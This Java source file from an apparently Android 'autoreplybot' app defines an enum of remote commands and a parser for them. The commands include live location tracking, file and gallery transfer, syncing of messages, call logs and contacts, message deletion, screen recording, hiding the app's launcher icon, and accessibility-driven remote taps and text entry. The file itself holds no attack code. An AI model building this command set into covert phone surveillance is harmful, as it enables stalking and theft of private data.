package com.autoreplybot.remote;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/** Device-management module commands (not WebRTC session commands). */
public enum RemoteModuleCommandAction {
    DEVICE_INFO_REFRESH,
    LOCATION_GET_CURRENT,
    LOCATION_START_LIVE,
    LOCATION_STOP,
    GALLERY_INDEX,
    GALLERY_METADATA,
    GALLERY_TRANSFER_REQUEST,
    GALLERY_DELETE_REQUEST,
    FILE_LIST,
    FILE_METADATA,
    FILE_DOWNLOAD_REQUEST,
    FILE_UPLOAD_PREPARE,
    FILE_UPLOAD_COMMIT,
    FILE_CREATE_FOLDER,
    FILE_RENAME,
    FILE_MOVE,
    FILE_COPY,
    FILE_DELETE,
    FILE_PREVIEW,
    FILE_CANCEL_TRANSFER,
    NOTIFICATIONS_SYNC,
    MESSAGES_SYNC,
    MESSAGES_DELETE,
    CALL_LOGS_SYNC,
    CONTACTS_SYNC,
    APPS_INDEX,
    APP_USAGE_SYNC,
    APP_BLOCK,
    APP_UNBLOCK,
    APP_BLOCKS_SYNC,
    SET_ALLOW_UNINSTALL,
    UNINSTALL_APP,
    SET_LAUNCHER_HIDDEN,
    SCREEN_LOCK,
    SCREEN_UNLOCK,
    SCREEN_RECORD_START,
    SCREEN_RECORD_STOP,
    SCREEN_RECORD_PAUSE,
    SCREEN_RECORD_RESUME,
    A11Y_START_SESSION,
    A11Y_STOP_SESSION,
    A11Y_PAUSE_SESSION,
    A11Y_RESUME_SESSION,
    A11Y_EMERGENCY_STOP,
    A11Y_STATUS,
    A11Y_TREE,
    A11Y_TAP,
    A11Y_DOUBLE_TAP,
    A11Y_LONG_PRESS,
    A11Y_SWIPE,
    A11Y_DRAG,
    A11Y_GLOBAL_ACTION,
    A11Y_NODE_ACTION,
    A11Y_SET_TEXT,
    A11Y_OPEN_APP,
    A11Y_RUN_TASK,
    A11Y_CANCEL_TASK,
    STATUS_REFRESH;

    @Nullable
    public static RemoteModuleCommandAction tryParse(@Nullable Object value) {
        if (value == null) return null;
        String raw = String.valueOf(value).trim().toUpperCase();
        if (raw.isEmpty()) return null;
        try {
            return valueOf(raw);
        } catch (IllegalArgumentException ignored) {
            return null;
        }
    }

    @NonNull
    public static RemoteModuleCommandAction fromValue(@Nullable Object value) {
        RemoteModuleCommandAction parsed = tryParse(value);
        return parsed != null ? parsed : STATUS_REFRESH;
    }
}
